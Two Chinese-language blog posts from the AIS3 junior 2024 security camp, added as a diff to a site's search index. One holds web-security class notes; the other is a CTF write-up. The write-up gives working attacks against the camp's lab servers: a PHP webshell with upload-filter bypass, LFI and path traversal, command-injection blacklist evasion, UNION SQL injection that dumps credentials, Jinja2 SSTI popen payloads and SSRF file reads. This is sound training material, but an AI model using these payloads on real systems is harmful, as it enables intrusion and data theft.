@@ -113,6 +113,352 @@
       </tags>
   </entry>
   <entry>
+    <title>AIS3 junior DAY2-網頁安全</title>
+    <url>/2024/08/18/AIS3-junior-DAY2-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h2 id="Basic-Web-Security"><a href="#Basic-Web-Security" class="headerlink" title="Basic Web Security"></a>Basic Web Security</h2><h3 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h3><ul>
+<li>網頁的表達方式<ul>
+<li>router based<ul>
+<li>透過程式控制頁面切換，不重新加載整個網站</li>
+</ul>
+</li>
+<li>file based<ul>
+<li>每個網頁文件對應一個 URL</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="Broken-Access-Control"><a href="#Broken-Access-Control" class="headerlink" title="Broken Access Control"></a>Broken Access Control</h3><p>網頁未成功執行身份驗證機制就是 Broken Access Control（訪問控制破壞）</p>
+<ul>
+<li>影響：影響完整性、RCE</li>
+</ul>
+<h3 id="RCE-Remote-Code-Command-Execution"><a href="#RCE-Remote-Code-Command-Execution" class="headerlink" title="RCE(Remote Code&#x2F;Command Execution)"></a>RCE(Remote Code&#x2F;Command Execution)</h3><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>透過網頁執行系統命令達成RCE</p>
+<ul>
+<li>體積小、隱蔽性高</li>
+<li>功能強大、易植入</li>
+<li>透過上傳檔案來部屬</li>
+<li>常見的繞過方式<ul>
+<li>使用未禁止的副檔名<ul>
+<li>PHP: pht, pthm, phtml, php5, php6…</li>
+<li>ASP: config, inc, ashx, axd, rem…</li>
+<li>JSP: jsw, wss, do, action, jspf…</li>
+</ul>
+</li>
+<li>副檔名大小寫混淆 <ul>
+<li>Php, PhP, pHP…</li>
+</ul>
+</li>
+<li>更改 Content-Type <ul>
+<li>image&#x2F;jpg</li>
+<li>image&#x2F;jpeg</li>
+<li>image&#x2F;png</li>
+</ul>
+</li>
+<li>改變file header</li>
+</ul>
+</li>
+</ul>
+<h3 id="Local-file-inclusion"><a href="#Local-file-inclusion" class="headerlink" title="Local file inclusion"></a>Local file inclusion</h3><ul>
+<li>PHP wrapper protocol - filter<ul>
+<li>將php引入為base64來逃避php解析</li>
+<li><code>php://filter/read=convert.base64-encode/resource=index.php</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
+<li>反射型 (較容易攻擊</li>
+<li>儲存型 (更具威脅性</li>
+<li>DOM型</li>
+</ul>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>injection  : 改變原始的語意</p>
+<ul>
+<li><p>Bash Operator</p>
+<ul>
+<li>;  – 結束指令並開始下一個指令</li>
+<li>|  – 將輸出傳遞給下一個指令</li>
+<li>&amp;  – 同時執行兩個指令(Windows)</li>
+<li>|| – 如果前一個指令執型失敗則執行</li>
+<li>&amp;&amp; – 如果前一個指令執行成功才執行</li>
+</ul>
+</li>
+<li><p>得知 injection 結果</p>
+<ul>
+<li>利用錯誤訊息得知 injection 結果</li>
+<li>利用 C2 Server 得知 injection 結果</li>
+</ul>
+</li>
+<li><p>Blackllist Evasion</p>
+<ul>
+<li>Space Evasion<ul>
+<li>cat${IFS}meow</li>
+</ul>
+</li>
+<li>CLRF Evasion<ul>
+<li>cat%0d%0ameow</li>
+</ul>
+</li>
+<li>Spilt Evasion<ul>
+<li>who$()ami</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Command Substitution</p>
+<ul>
+<li>&#96;&#96; – 命令替換 可以執行一個命令 並作為參數輸出給外層命令</li>
+</ul>
+</li>
+</ul>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="MySQL-Injection-必備語法知識-101"><a href="#MySQL-Injection-必備語法知識-101" class="headerlink" title="MySQL Injection 必備語法知識 101"></a>MySQL Injection 必備語法知識 101</h3><ul>
+<li>Information_schema：MySQL裡面的Wikipedia，存了所有相關DB, TABLE, COLUMNS的資訊</li>
+<li>SELECT 選取資料：像是 SELECT password FROM meow_table</li>
+<li>UNION 聯集選取：像是 SELECT fox FROM whale_table UNION SELECT password FROM meow_table，這樣的語法如果前面成立後面就不選，但如果是UNION ALL SELECT 就會強制執行，然後一起噴出來</li>
+<li>group_concat 串接資料：SELECT group_concat(password) FROM meow_table</li>
+</ul>
+<h3 id="一個最基礎的-SQL-Injection"><a href="#一個最基礎的-SQL-Injection" class="headerlink" title="一個最基礎的 SQL Injection"></a>一個最基礎的 SQL Injection</h3><blockquote>
+<p>WHERE username&#x3D;’<font color="FF0000">admin’ or 1&#x3D;1 --</font>‘ and password&#x3D;</p>
+</blockquote>
+<p>白色的部分是原本網站寫的驗證語法，紅色的部分代表攻擊者輸入的 Injection</p>
+<h3 id="Arbitrary-File-Read"><a href="#Arbitrary-File-Read" class="headerlink" title="Arbitrary File Read"></a>Arbitrary File Read</h3><ul>
+<li>MySQL - LOAD_FILE<ul>
+<li>SELECT “AAA” INTRO DUMPFILE “&#x2F;tmp&#x2F;a”</li>
+</ul>
+</li>
+</ul>
+<h3 id="BlackList-Evasion"><a href="#BlackList-Evasion" class="headerlink" title="BlackList Evasion"></a>BlackList Evasion</h3><ul>
+<li>Space Evasion<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT/**/1</span><br><span class="line">	SELECT(1),2,3</span><br><span class="line">	--%0F</span><br></pre></td></tr></table></figure></li>
+<li>Case Evasion<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION -&gt; union</span><br><span class="line">SELECT -&gt; select</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Server-Side-Template-Injection"><a href="#Server-Side-Template-Injection" class="headerlink" title="Server-Side Template Injection"></a>Server-Side Template Injection</h2><p>伺服器端模板注入</p>
+<ul>
+<li>攻擊影響<ul>
+<li>所有網站的使用者</li>
+</ul>
+</li>
+</ul>
+<h3 id="What-is-Template"><a href="#What-is-Template" class="headerlink" title="What is Template"></a>What is Template</h3><p>讓網站的伺服器可以根據變數或資料，動態生成網頁內容</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>伺服器請求偽造</p>
+<blockquote>
+<p>攻擊者對伺服器外網送 payload，透過外網取得內網的資訊。</p>
+</blockquote>
+<h3 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h3><p>發出一般的 HTTP 請求<br>企業開發軟體，wiki&#x2F;docs 放在內網</p>
+<h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><p>存取本地檔案<br>網站原始碼</p>
+<h3 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h3><p>送出 TCP Stream</p>
+<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><p>攻擊者連接到受害者系統並執行命令</p>
+<h1 id="LLM"><a href="#LLM" class="headerlink" title="LLM"></a>LLM</h1><h2 id="transformer"><a href="#transformer" class="headerlink" title="transformer"></a>transformer</h2><p>encoder discoder<br><img src="https://hackmd.io/_uploads/SJnZQYn90.png" alt="image"></p>
+<h2 id="有名的LLM"><a href="#有名的LLM" class="headerlink" title="有名的LLM"></a>有名的LLM</h2><ul>
+<li>LLAMA</li>
+<li>百度-文言一心</li>
+</ul>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>向量維度</li>
+<li>position encoding</li>
+<li>self-attention：知道每個詞之間的相關性</li>
+<li>multiple attention：越多層AI越準確?</li>
+</ul>
+<p>透過已知文本猜測後面的結果</p>
+]]></content>
+      <categories>
+        <category>2024 AIS3 junior</category>
+      </categories>
+      <tags>
+        <tag>共筆筆記</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AIS3 junior DAY2 網頁安全 writeup</title>
+    <url>/2024/10/07/AIS3%20junior%20DAY2%20%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%20writeup/</url>
+    <content><![CDATA[<h1 id="AIS3-junior-DAY2-上午-網頁安全"><a href="#AIS3-junior-DAY2-上午-網頁安全" class="headerlink" title="AIS3 junior DAY2 上午 網頁安全"></a>AIS3 junior DAY2 上午 網頁安全</h1><p>[TOC]</p>
+<h2 id="01-Broken-Access-Control"><a href="#01-Broken-Access-Control" class="headerlink" title="01 - Broken Access Control"></a>01 - Broken Access Control</h2><h3 id="BAC01"><a href="#BAC01" class="headerlink" title="BAC01"></a>BAC01</h3><p>隨便打一個名子login<br>查看url <a href="http://ctfd-ais3.crazyfirelee.tw:9001/user">http://ctfd-ais3.crazyfirelee.tw:9001/user</a><br>將<code>user</code>改成<code>admin</code><br><img src="https://hackmd.io/_uploads/B1X-5r3cA.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{FirstBROKENAccessControl;}</p>
+</blockquote>
+<h3 id="BAC02"><a href="#BAC02" class="headerlink" title="BAC02"></a>BAC02</h3><p>到<code>Product List</code>裡面觀察每個 <code>View Details</code>的 url 發現後面都有編號且唯獨少了4<br>將4打上去url試試看 <a href="http://ctfd-ais3.crazyfirelee.tw:9002/product/4">http://ctfd-ais3.crazyfirelee.tw:9002/product/4</a><br><img src="https://hackmd.io/_uploads/HkwJiB39R.png" alt="image"><br>點<code>buy</code>進去拿到flag<br><img src="https://hackmd.io/_uploads/Hk-fsS29R.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{BroJustFoundBabyIDORVulnerability}</p>
+</blockquote>
+<h3 id="BAC03"><a href="#BAC03" class="headerlink" title="BAC03"></a>BAC03</h3><p>先用第一題的方法試試看 將url後面改成<code>admin</code><br><img src="https://hackmd.io/_uploads/BJaS9L25C.png" alt="image"><br>沒有辦法得到flag<br>換另一種方法 用linux的<code>curl</code>試試看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://ctfd-ais3.crazyfirelee.tw:9003/admin</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SyWzoU35R.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{BabyBRokenAccEssControoooooool}</p>
+</blockquote>
+<h2 id="02-File-Upload"><a href="#02-File-Upload" class="headerlink" title="02 - File Upload"></a>02 - File Upload</h2><h3 id="FIL01"><a href="#FIL01" class="headerlink" title="FIL01"></a>FIL01</h3><p>先寫一個webshell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>檔名用<code>.php</code>結尾<br>將webshell上傳<br><img src="https://hackmd.io/_uploads/rk0KOShqA.png" alt="image"></p>
+<p>將url改成 <a href="http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php</a><br>利用剛才上傳的webshell<br>將命令打在url後面<code>?cmd=ls ../</code><br>結果如下圖<em>找到了FLAG</em><br><img src="https://hackmd.io/_uploads/rye_PS3q0.png" alt="image"></p>
+<p>將命令改成<code>?cmd=cat ../FLAG</code><br><img src="https://hackmd.io/_uploads/r13xKrn90.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{FirstWEBSHELLXDDD}</p>
+</blockquote>
+<h3 id="FIL02"><a href="#FIL02" class="headerlink" title="FIL02"></a>FIL02</h3><p>先寫一個webshell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>將檔名改成 <code>(隨你喜歡).jpg.php </code><br>上傳時用brup將他攔下來<br><img src="https://hackmd.io/_uploads/Bkj2HBn5C.png" alt="image"><br>將<code>Contect -Type </code>後面改成 <code>image/jpg</code><br><code>forward</code>的結果如圖<br><img src="https://hackmd.io/_uploads/B1IyESn50.png" alt="image"></p>
+<p>將url改成 <a href="http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php</a><br>利用剛才上傳的webshell<br>將命令打在url後面<code>?cmd=ls ../</code><br>結果如下圖<em>找到了FLAG</em><br><img src="https://hackmd.io/_uploads/rye_PS3q0.png" alt="image"></p>
+<p>將命令改成<code>?cmd=cat ../FLAG</code><br><img src="https://hackmd.io/_uploads/ryF6DH25A.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{BabyUploadBypass}</p>
+</blockquote>
+<h2 id="03-Local-File-Inclusion"><a href="#03-Local-File-Inclusion" class="headerlink" title="03 - Local File Inclusion"></a>03 - Local File Inclusion</h2><h3 id="LFI01"><a href="#LFI01" class="headerlink" title="LFI01"></a>LFI01</h3><p>照片很可疑<br>將照片url複製 <a href="http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=static/bitcoinCat.jpg">http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=static/bitcoinCat.jpg</a></p>
+<p>利用上課所教的<code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>先把<code>static/bitcoinCat.jpg</code>給刪掉</p>
+<p>把<code>php://filter/read=convert.base64-encode/resource=index.php</code>加進去url中<br>改成 <a href="http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=php://filter/read=convert.base64-encode/resource=index.php">http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=php://filter/read=convert.base64-encode/resource=index.php</a></p>
+<p>獲得一段base64加密過的東西<img src="https://hackmd.io/_uploads/Bk9U6rn5A.png" alt="image"></p>
+<p>全選複製後去先上平台解密<br><img src="https://hackmd.io/_uploads/Hkv9aBnqC.png" alt="image"></p>
+<p>得到帳號:<code>admin</code> 密碼:<code>CATLOVEBITCOINMEOWMEOW</code><br>得到flag</p>
+<p><img src="https://hackmd.io/_uploads/HyWAaH2c0.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{php:&#x2F;&#x2F;filter&#x2F;BabyPHPLFI.b64decode()}</p>
+</blockquote>
+<h3 id="LFI02"><a href="#LFI02" class="headerlink" title="LFI02"></a>LFI02</h3><p>像FIL01和FIL02一樣 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>將webshell檔案上傳<br><img src="https://hackmd.io/_uploads/H1XlhI3qA.png" alt="image"></p>
+<p>發現檔案在<code>tmp</code>底下 而tmp又在根目錄底下<br>所以我們要利用..&#x2F;..&#x2F;..&#x2F;..&#x2F; 跳到根目錄<br>在將 <code>/tmp/a764c_108.160.138.201.php</code>貼到根目錄後面<br>像是這樣 <a href="http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php</a></p>
+<p>接著再用<code>&amp;cmd=ls</code> 獲得我們想要的檔案 <code>S3Cr3TFLAGGGGG</code></p>
+<p><img src="https://hackmd.io/_uploads/BkBv1Dh9C.png" alt="image"></p>
+<p>最後用<code>cat S3Cr3TFLAGGGGG</code> 將flag印出</p>
+<p><img src="https://hackmd.io/_uploads/S17ngDnqR.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;BADBAD.php?LFI&#x3D;SUCCESS}</p>
+</blockquote>
+<h2 id="05-Command-Injection"><a href="#05-Command-Injection" class="headerlink" title="05 - Command Injection"></a>05 - Command Injection</h2><h3 id="CMD01"><a href="#CMD01" class="headerlink" title="CMD01"></a>CMD01</h3><p>先用<code>;ls</code> 查看有什麼東西</p>
+<p><img src="https://hackmd.io/_uploads/Skk8Ew3qC.png" alt="image"></p>
+<p>發現有很多像flag的東西<br>先用cat印出<code>REAL_FLAG</code><br><em>發現是騙人的</em></p>
+<p>再去試試看<code>FLAG</code> 就出來了</p>
+<p><img src="https://hackmd.io/_uploads/Hyas4D3cC.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{BabyCommand;InjectionXDDDddddd}</p>
+</blockquote>
+<h3 id="CMD02"><a href="#CMD02" class="headerlink" title="CMD02"></a>CMD02</h3><p>想和上一題一樣 用<code>;ls</code> 結果沒有辦法<br>上網發現<code>;echo *</code> 也有一樣的效果<br><img src="https://hackmd.io/_uploads/H1s_CwhcC.png" alt="image"><br>找到FLAG<br>用<code>;c\at F*</code>繞過黑名單 當作<code>cat FLAG</code> 得到flag</p>
+<blockquote>
+<p>AIS3_Junior{niceWordBL$()ACKListEvasion;}</p>
+</blockquote>
+<h3 id="CMD03"><a href="#CMD03" class="headerlink" title="CMD03"></a>CMD03</h3><ul>
+<li>用<code>$(l$&#123;x&#125;s|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code> 繞過黑名單 </li>
+<li>用base64加密列出<code>ls</code>的東西<br><del>發現跟[Bonus] CMD06一樣</del><br><del>就用跟[Bonus] CMD06一樣的解法</del></li>
+<li>用<code>$(ca$&#123;x&#125;t$&#123;IFS&#125;FLAG|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code>將flag以base64印出<br><img src="https://hackmd.io/_uploads/H1IZqkp5A.png" alt="image"><br><code>AIS3_Junior&#123;BashOperato|rEvasion$&#123;IFS&#125;SUCC|ESSFUL|:DDDDD&#125;</code></li>
+</ul>
+<h3 id="Bonus-CMD06"><a href="#Bonus-CMD06" class="headerlink" title="[Bonus] CMD06"></a>[Bonus] CMD06</h3><ul>
+<li>用<code>$(l$&#123;x&#125;s|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code> 繞過黑名單 </li>
+<li>用base64加密列出<code>ls</code>的東西<br><img src="https://hackmd.io/_uploads/HyGrPJTcA.png" alt="image"></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RkxBRwptYWluLnB5CnByZXN0YXJ0LnNoCnJlcXVpcmVtZW50cy50eHQKc3RhdGljCnRlbXBsYXRlcwp1d3NnaS5pbmkK</span><br></pre></td></tr></table></figure>
+<ul>
+<li>把上述用線上解密</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/S1itwJa9A.png" alt="image"></p>
+<ul>
+<li>發現FLAG</li>
+<li>用<code>$(ca$&#123;x&#125;t$&#123;IFS&#125;FLAG|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code>將flag以base64印出<br><img src="https://hackmd.io/_uploads/HkbxuJpq0.png" alt="image"><br>*<code>QUlTM19KdW5pb3J7b3VvX2hpaGl9Cg==</code>用base64線上解密<br><img src="https://hackmd.io/_uploads/BkAmuk6q0.png" alt="image"></li>
+</ul>
+<h2 id="06-SQL-Injection"><a href="#06-SQL-Injection" class="headerlink" title="06 - SQL Injection"></a>06 - SQL Injection</h2><h3 id="SQL1"><a href="#SQL1" class="headerlink" title="SQL1"></a>SQL1</h3><p>用最簡單的SQL語法就可以拿到flag<br><del>好像簡單的CTF第一題SQL都可以用<code>admin&#39;--</code></del><br>帳號<code>admin&#39;--</code> 密碼隨便填<br><img src="https://hackmd.io/_uploads/B1FZku3cR.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{SQL’InjectionXDorD&#x3D;D_–_-}</p>
+</blockquote>
+<h3 id="SQL2"><a href="#SQL2" class="headerlink" title="SQL2"></a>SQL2</h3><p>參考網站: <a href="https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/">https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/</a><br>先用<code>pp&#39;UNION SELECT NULL#</code>去嘗試讓兩個表中有相同的columns<br><img src="https://hackmd.io/_uploads/BJZSV-a9A.png" alt="image"></p>
+<ul>
+<li>直到<code>pp&#39; UNION SELECT NULL, NULL,NULL,NULL#</code></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BkJj4Zp9A.png" alt="image"></p>
+<p>*列出所有table</p>
+<ol>
+<li>mysql</li>
+<li>information_schema</li>
+<li>performance_schema</li>
+<li>sys</li>
+<li>arsenal</li>
+<li>ApexPredators<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(schema_name),group_concat(schema_name),group_concat(schema_name),group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure>
+<img src="https://hackmd.io/_uploads/HJzhUW69A.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1fMGYa5C.png" alt="image"></li>
+</ol>
+<ul>
+<li>發現網頁左上角剛好是第六個table的名稱 猜測可能是要到<code>ApexPredators</code></li>
+<li>試試看將我們所要的table:<code>ApexPredators</code>抓出來</li>
+<li>接著繼續往下找ApexPredators的東西<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(table_name),group_concat(table_name),group_concat(table_name),group_concat(table_name) from information_schema.tables where table_schema=&#x27;ApexPredators&#x27; #</span><br></pre></td></tr></table></figure>
+<img src="https://hackmd.io/_uploads/BkoQ_-p5C.png" alt="image"></li>
+<li>發現有users</li>
+<li>繼續往下找users的東西<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(column_name),group_concat(column_name),group_concat(column_name),group_concat(column_name) from information_schema.columns where table_schema=&#x27;ApexPredators&#x27; and table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
+<img src="https://hackmd.io/_uploads/r1MidbaqC.png" alt="image"></li>
+<li>發現users底下有 id,isAdmin,password,username</li>
+<li>印出id,isAdmin,password,username裡面的內容<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pp&#x27; UNION SELECT id,username,password,isAdmin from ApexPredators.users#</span><br></pre></td></tr></table></figure>
+<img src="https://hackmd.io/_uploads/rkuIFZpc0.png" alt="image"></li>
+<li>發現只有<code>KubenBlisk</code>下面的值是1 <del>大膽假設是admin</del><br>帳號:KubenBlisk 密碼:BliskLeader#2024<br>登入後就得到flag<br><img src="https://hackmd.io/_uploads/rJFf5ba9A.png" alt="image"></li>
+</ul>
+<h2 id="07-Server-Side-Template-Injection"><a href="#07-Server-Side-Template-Injection" class="headerlink" title="07 - Server-Side Template Injection"></a>07 - Server-Side Template Injection</h2><h3 id="STI01"><a href="#STI01" class="headerlink" title="STI01"></a>STI01</h3><p>參考資料:</p>
+<ul>
+<li><a href="https://blog.1997sty.com/archives/5570">https://blog.1997sty.com/archives/5570</a></li>
+<li><a href="https://ithelp.ithome.com.tw/articles/10244403">https://ithelp.ithome.com.tw/articles/10244403</a></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/S1h1AZ6qA.png" alt="image"><br>裡面有:<code>.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</code></p>
+<ul>
+<li><p>__class__抓到底下的str</p>
+</li>
+<li><p>__base__抓到str上層的object</p>
+</li>
+<li><p><strong>subclasses</strong>() Object底下所有的東西，包含函式等[138]應該是popen object</p>
+</li>
+<li><p><strong>init</strong> 初始化 object</p>
+</li>
+<li><p><strong>globals</strong>[‘popen’] 初始化object下的popen<br>(‘cat FLAG’).read() popen執行cat FLAG並讀出來</p>
+</li>
+<li><p>將payload改為:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat FLAG&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>即可拿到flag<br><img src="https://hackmd.io/_uploads/r1PdRZacR.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{.<strong>JinjaTWOOOO.</strong>_[“SSTI”]<strong>.succ3ssXDD.</strong>}</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="STI02"><a href="#STI02" class="headerlink" title="STI02"></a>STI02</h3><p>參考資料: </p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars</a></li>
+<li><a href="https://ithelp.ithome.com.tw/articles/10244403">https://ithelp.ithome.com.tw/articles/10244403</a></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HJBl8z6q0.png" alt="image"></p>
+<p>從全域物件中獲取任何函數，可存取<code>__globals__.__builtins__</code>，實現RCE</p>
+<p>payload:<code>&#123;&#123;request.application.__globals__.__builtins__.__import__('os').popen('cat FLAG').read()&#125;&#125;</code></p>
+<p><img src="https://hackmd.io/_uploads/SkjO8zTqC.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}</p>
+</blockquote>
+<h2 id="08-Server-Side-Request-Forgery"><a href="#08-Server-Side-Request-Forgery" class="headerlink" title="08 - Server-Side Request Forgery"></a>08 - Server-Side Request Forgery</h2><h3 id="SRF01"><a href="#SRF01" class="headerlink" title="SRF01"></a>SRF01</h3><ul>
+<li>題目有提示 <code>Flag Location : /app/FLAG</code></li>
+<li>發現可以用<code>file:// 表示這是一個本地文件的路徑</code>來去看題目給的路徑</li>
+<li>於是我們直接在網站payload -&gt;<code>file:///app/FLAG</code></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Sy_n9dh90.png" alt="image"></p>
+<p>點擊右邊的圖片的原始碼<br><img src="https://hackmd.io/_uploads/B1Slsu3qC.png" alt="image"><br>可以發現有一個被base64加密的東西<br><code>QUlTM19KdW5pb3J7ZmlsZTovL1NTUkZfX19YREREfQ==</code><br>線上解密之後拿到flag<br><img src="https://hackmd.io/_uploads/ryqLju2qC.png" alt="image"></p>
+<blockquote>
+<p>AIS3_Junior{file:&#x2F;&#x2F;SSRF___XDDD}</p>
+</blockquote>
+<h3 id="SRF02"><a href="#SRF02" class="headerlink" title="SRF02"></a>SRF02</h3><p>參考資料 <a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><img src="https://hackmd.io/_uploads/By27jWaqA.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/environ #可查看當下進程的環境變量</span><br></pre></td></tr></table></figure>
+<ul>
+<li>跟上題一樣用<code>file://</code></li>
+<li>payload&#x3D;<code>file:///proc/self/environ</code></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Byg3s-65C.png" alt="image"></p>
+<ul>
+<li>查看圖片原始檔<br><img src="https://hackmd.io/_uploads/Sk_khba5R.png" alt="image"></li>
+</ul>
+<p>發現有base64加密的內容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SE9TVE5BTUU9MTIzMWRlMGVjMjZlAFBZVEhPTl9QSVBfVkVSU0lPTj0yMy4wLjEASE9NRT0vcm9vdABQWVRIT05VTkJVRkZFUkVEPTEAR1BHX0tFWT1BMDM1QzhDMTkyMTlCQTgyMUVDRUE4NkI2NEU2MjhGOEQ2ODQ2OTZEAFVXU0dJX0lOST0vYXBwL3V3c2dpLmluaQBOR0lOWF9NQVhfVVBMT0FEPTAAVVdTR0lfUFJPQ0VTU0VTPTE2AFBZVEhPTkRPTlRXUklURUJZVEVDT0RFPTEAU1RBVElDX1VSTD0vc3RhdGljAFBZVEhPTl9HRVRfUElQX1VSTD1odHRwczovL2dpdGh1Yi5jb20vcHlwYS9nZXQtcGlwL3Jhdy82NmQ4YTBmNjM3MDgzZTJjM2RkZmZjMGNiMWU2NWNlMTI2YWZiODU2L3B1YmxpYy9nZXQtcGlwLnB5AFVXU0dJX0NIRUFQRVI9MgBQQVRIPS91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbgBMQU5HPUMuVVRGLTgAUFlUSE9OX1ZFUlNJT049My4xMC4xNABQWVRIT05fU0VUVVBUT09MU19WRVJTSU9OPTY1LjUuMQBOR0lOWF9XT1JLRVJfUFJPQ0VTU0VTPTEATElTVEVOX1BPUlQ9ODAAU1RBVElDX0lOREVYPTAAUFdEPS9hcHAAUFlUSE9OX0dFVF9QSVBfU0hBMjU2PTZmYjdiNzgxMjA2MzU2ZjQ1YWQ3OWVmYmIxOTMyMmNhYTZjMmE1YWQzOTA5MmQwZDQ0ZDBmZWM5NDExN2UxMTgAU1RBVElDX1BBVEg9L2FwcC9zdGF0aWMAUFlUSE9OUEFUSD0vYXBwAEZMQUc9QUlTM19KdW5pb3J7aHR0cDovL0JST0FjY2Vzc0xPQ0FMfQA=</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>放到線上平台解密</li>
+<li>得到flag<br><img src="https://hackmd.io/_uploads/ByRI2-pcA.png" alt="image"><blockquote>
+<p>AIS3_Junior{<a href="http://broaccesslocal}/">http://BROAccessLOCAL}</a></p>
+</blockquote>
+</li>
+</ul>
+]]></content>
